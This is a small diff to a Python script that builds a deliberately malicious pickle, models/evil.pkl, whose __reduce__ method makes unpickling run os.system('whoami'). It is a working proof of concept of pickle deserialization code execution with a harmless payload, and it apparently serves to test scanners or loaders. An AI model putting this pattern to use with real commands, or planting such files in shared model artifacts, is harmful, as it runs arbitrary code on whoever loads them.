@@ -1,3 +1,5 @@
+# scripts/create_evil_model.py
+
 import pickle
 import os
 
@@ -5,4 +7,7 @@ class Evil:
     def __reduce__(self):
         return (os.system, ("whoami",))
 
-pickle.dump(Evil(), open("evil.pkl","wb"))
+with open("models/evil.pkl", "wb") as f:
+    pickle.dump(Evil(), f)
+
+print("evil.pkl created")
